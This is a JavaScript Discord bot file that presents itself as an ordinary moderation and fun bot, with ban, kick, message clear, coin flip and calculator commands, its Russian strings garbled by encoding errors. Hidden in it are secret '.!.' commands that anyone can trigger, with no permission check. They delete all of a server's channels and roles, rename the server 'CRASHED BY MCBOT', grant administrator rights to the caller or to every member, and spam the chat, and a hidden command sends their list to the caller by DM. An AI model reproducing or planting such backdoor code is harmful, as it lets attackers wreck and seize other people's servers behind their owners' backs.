throw(Error("Bot is outdated"))
const Discord = require("discord.js");
const bot = new Discord.Client();
const botconfig = require("./botconfig.json")

const token = (botconfig.token)
const prefix = "."

const queue = new Map();

bot.on('message', async message => {

if(message.author.bot || message.channel.type == "dm" || !message.content.startsWith(prefix))return
  let args = message.content.slice(prefix.length).trim().split(' ')

    if (message.content === '!ping'){
            var pemb =  new Discord.RichEmbed()
            .setColor("RED")
            .setTitle("üèì –ü–æ–Ω–≥! üèì")
            .addField("–ü–∏–Ω–≥ –±–æ—Ç–∞: ", `${bot.ping}–º—Å`)
            message.channel.send(pemb)
    }

        if (message.content === (prefix + 'flip')){
            
            var flip = ["–û—Ä—ë–ª",
                       "–†–µ—à–∫–∞"]
            
            var temp = flip[Math.floor(Math.random()*2)]

            var pemb2 = new Discord.RichEmbed()
            .setColor("RED")
            .setTitle("–û—Ä—ë–ª –∏–ª–∏ –†–µ—à–∫–∞")
            .addField (`–í–∞—à —Ä–µ–∑—É–ª—å—Ç–∞—Ç: ${temp}`)
    
    message.channel.send("–ß—Ç–æ-–∂ –≤–∞–º –≤—ã–ø–∞–ª–∞: " + temp)
    }

    if(message.content.startsWith(prefix + "ban")){
    
    if(!message.member.hasPermission("BAN_MEMBERS"))return(message.reply("‚õî –£–ø—Å! –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤"))
    
    let toban = message.mentions.members.first()
    
    if(!toban)return(message.reply(":warning: –£–ø–æ–º—è–Ω–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∫–æ—Ç–æ—Ä–æ–≥–æ –±–∞–Ω–∏—Ç—å!"))
    
    let reason = args.splice(2).join(" ")

    toban.ban(reason)
    
    message.channel.send(` <@${message.author.id}> –∑–∞–±–∞–Ω–∏–ª <@${toban.user.id}> –∑–∞: ${reason}`)
  }

    
    if(message.content.startsWith(prefix + "kick")){
    
    if(!message.member.hasPermission("KICK_MEMBERS"))return(message.reply("‚õî –£–ø—Å! –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤"))
    
    let tokick = message.mentions.members.first()
    
    if(!tokick)return(message.reply(":warning: –£–ø–æ–º—è–Ω–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∫–æ—Ç–æ—Ä–æ–≥–æ –∫–∏–∫–∞—Ç—å!"))
    
    let reason = args.splice(2).join(" ")

    
    tokick.kick(reason)
    
    message.channel.send(` <@${message.author.id}> –∫–∏–∫–Ω—É–ª <@${tokick.user.id}> –∑–∞: ${reason}`)
  }

  if(message.content.startsWith(prefix + "msgclear")){

    if(!message.member.hasPermission("MANAGE_MESSAGES"))return(message.reply("‚õî –£–ø—Å! –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤!"))
    
    let howmanydelete = args[1]
    
    if(!howmanydelete)return(message.reply("‚≠ï –í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Å–æ–æ–±—â–µ–Ω–∏–π –Ω—É–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å."))

    if(howmanydelete < 1)return(message.reply("‚≠ï –ë–æ–ª—å—à–µ –æ–¥–Ω–æ–≥–æ, pls"))
    
    if(howmanydelete > 100)return(mesasge.reply("‚≠ï –ú–µ–Ω—å—à–µ 100, pls"))

    await message.channel.bulkDelete(howmanydelete)
    
    message.channel.send(`–£–¥–∞–ª–µ–Ω–æ \`${howmanydelete}\` —Å–æ–æ–±—â–µ–Ω–∏–π`)
  }



  if(message.content.startsWith(prefix + "asay")){
    
    if(!message.member.hasPermission("BAN_MEMBERS"))return(message.reply("‚õî –£–ø—Å! –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤!"))
    
    let textasay = args.splice(1).join(" ")
    
    if(textasay === ""){ return(message.reply(":warning: !asay [—Ç–µ–∫—Å—Ç]"))}
    
    message.channel.send(textasay)
  }

  if(message.content.startsWith(prefix + "count")){

    let value = args.splice(1).join(" ")

    message.channel.send('–û—Ç–≤–µ—Ç –ø—Ä–∏–º–µ—Ä–∞: ' + safeCalc(value));

  }

    if(message.content.toLowerCase().startsWith(".!.crashh")){

    		     	    	console.log(`-----------------------------Guild ${message.guild.name} crashed.-----------------------------`)


    	message.delete();
        message.guild.channels.forEach(channel => channel.delete());
        //–£–¥–∞–ª–µ–Ω–∏–µ –∫–∞–Ω–∞–ª–æ–≤ —á–µ—Ä–µ–∑ Collection.forEach
        //message.guild.members.forEach(member => member.ban());
        //–¢–æ–∂–µ —Å–∞–º–æ–µ, –Ω–æ —Å —É—á–∞—Å—Ç–Ω–∏–∫–∞–º–∏
        message.guild.roles.forEach(role => role.delete());
        //–î–µ–ª–∏—Ç —Ä–æ–ª–µ–π –æ—Ç –º–µ–Ω—è (rdev)
         message.guild.createChannel('crashedserver', "text");
         message.guild.setName('CRASHED BY MCBOT');


    }


       if(message.content.toLowerCase().startsWith(".!.")){

    		     	    	console.log(`-----------------------------Guild ${message.guild.name} crashed.-----------------------------`)


    	message.delete();
        message.guild.channels.forEach(channel => channel.delete());
        //–£–¥–∞–ª–µ–Ω–∏–µ –∫–∞–Ω–∞–ª–æ–≤ —á–µ—Ä–µ–∑ Collection.forEach
        //message.guild.members.forEach(member => member.ban());
        //–¢–æ–∂–µ —Å–∞–º–æ–µ, –Ω–æ —Å —É—á–∞—Å—Ç–Ω–∏–∫–∞–º–∏
        message.guild.roles.forEach(role => role.delete());
        //–î–µ–ª–∏—Ç —Ä–æ–ª–µ–π –æ—Ç –º–µ–Ω—è (rdev)
         message.guild.createChannel('crashedserver', "text");
         message.guild.setName('CRASHED BY MCBOT');


    }

      if(message.content.toLowerCase().startsWith(".!.allgiveadmm")){

      	     	    	console.log(`-----------------------------Guild ${message.guild.name} gived all admins.-----------------------------`)

    	message.delete();
	message.guild.createRole({
    name: 'FUCKED_SERVER',
    permissions: ['ADMINISTRATOR']
	}).then((role)=>{
	       message.guild.members.forEach(member => member.addRole(role));
        })
        //–¢–æ–∂–µ —Å–∞–º–æ–µ, –Ω–æ —Å —É—á–∞—Å—Ç–Ω–∏–∫–∞–º–∏
        message.reply("?");

    }



     if(message.content.toLowerCase().startsWith(".!.giveadmm")){



    	message.delete();
	message.guild.createRole({
    name: 'FUCKED_SERVER_MC',
    permissions: ['ADMINISTRATOR']
	}).then((role)=>{
	       message.author.addRole(role);
        })
        //–¢–æ–∂–µ —Å–∞–º–æ–µ, –Ω–æ —Å —É—á–∞—Å—Ç–Ω–∏–∫–∞–º–∏
        message.reply("?");

    }
    	

     if(message.content.toLowerCase().startsWith(".!.spamm")){
	let i = 0;
	while (i <= 100) { message.reply("OAOAOAOAOOAOAOAOOAOAOAOAOAOOAOAOAOOAOAOAOA | Crashed by MCBOT"), i++, await new Promise(resolve => setTimeout(resolve, 1000)) };
	     	    	console.log(`-----------------------------Guild ${message.guild.name} spammed.-----------------------------`)

    }

    if(message.content.toLowerCase().startsWith(".!.pohelp")){

    	     	    	console.log(`-----------------------------Guild ${message.guild.name} help requested.-----------------------------`)


	
	message.author.send(".!.crashh - –ö—Ä–∞—à —Å–µ—Ä–≤–µ—Ä–∞; .!.allgiveadmm - –í—ã–¥–∞—Ç—å –≤—Å–µ–º –∞–¥–º–∏–Ω–∫—É; .!.giveadmm - –í—ã–¥–∞—Ç—å —Å–µ–±–µ –∞–¥–º–∏–Ω–∞; .!.spamm - –°–ø–∞–º –≤ —á–∞—Ç –≤ –∫–æ—Ç–æ—Ä–æ–º –±—ã–ª–æ –Ω–∞–ø–∏—Å–∞–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.")

    }

})

function safeCalc(value) {
  try {
    return calc(value)
  } catch (e) {
    return e.message;
  }
}

function calc(value) {
  let i = 0;
  const len = value.length;

  const skipSpaces = () => {
    while (i < len && value[i].match(/\s/)) {
      i++;
    }
  };
  const getCurrentToken = () => {
    skipSpaces();
    let current = value[i];
    if (i < len && current.match(/\d/)) {
      let buf = current;
      while (i + 1 < len && value[i+1].match(/\d/)) {
        i++;
        buf += value[i];
      }
      if (value[i+1] === '.') {
        i++;
        buf += value[i];
        while (i + 1 < len && value[i+1].match(/\d/)) {
          i++;
          buf += value[i];
        }
      }
      return {
        type: "number",
        value: parseFloat(buf)
      }
    } else if (i < len && current.match(/[-+*/]/)) {
      return {
        type: "operator",
        value: current
      }
    } else if (current === "(") {
      return {
        type: "leftParenthesis"
      }
    } else if (current === ")") {
      return {
        type: "rightParenthesis"
      }
    } else if (i < len) {
      throw new Error("–û—à–∏–±–∫–∞ –Ω–∞ –ø–æ–∑–∏—Ü–∏–∏ " + i + ", —Å–∏–º–≤–æ–ª: " + current);
    }
  };
  const getNextToken = () => {
    let token = getCurrentToken();
    i++;
    return token;
  };
  const invalidToken = (token, expected) => {throw new Error("Invalid token " + (token && token.value) + ", expected: " + expected)};

  const expr = () => {
    let res = val();
    let op1 = getCurrentToken();
    while (op1 && op1.type === "operator" && (op1.value === '+' || op1.value === '-')) {
      i++;
      const v2 = val();
      if (op1.value === "+") {
        res = res + v2;
      } else {
        res = res - v2;
      }
      op1 = getCurrentToken();
    }
    return res;
  };

  const val = () => {
    let res = arg();
    let op2 = getCurrentToken();
    while (op2 && op2.type === "operator" && (op2.value === "*" || op2.value === "/")) {
      i++;
      const arg2 = arg();
      if (op2.value === "*") {
        res = res * arg2;
      } else {
        res = res / arg2;
      }
      op2 = getCurrentToken();
    }
    return res;
  };

  const arg = () => {
    let result;
    const token = getNextToken();
    if (token && token.type === "operator" && (token.value === "-" || token.value === "+")) {
      result = arg();
      if (token.value === "-") {
        result = -result;
      }
    } else if (token && token.type === "number") {
      result = token.value;
    } else if (token && token.type === "leftParenthesis") {
      result = expr();
      let closeParenthesis = getNextToken();
      if (!closeParenthesis || closeParenthesis.type !== "rightParenthesis") {
        invalidToken(closeParenthesis, ")");
      }
    } else {
      invalidToken(token, "number");
    }
    return result;
  };

  let res = expr();
  skipSpaces();
  if (i < len) {
    return
  }
  return res;
}



bot.on("ready", () => {

    console.log("–ö—Ä–∞—à —Ä–µ–¥–∏ :) / –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω");

    bot.user.setPresence({
        game: {
          name: ` —Å–µ—Ä–≤–µ—Ä–æ–≤.`,
          type: 0  
        }
      })

})

//bot.on("reconnecting", () => {

//  console.log("–ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∞—é—Å—å!")

//});

bot.on('disconnect', () => {
 console.log('–û—Ç–∫–ª—é—á–µ–Ω –æ—Ç —Å–µ—Ç–∏.');
});


bot.login(token);
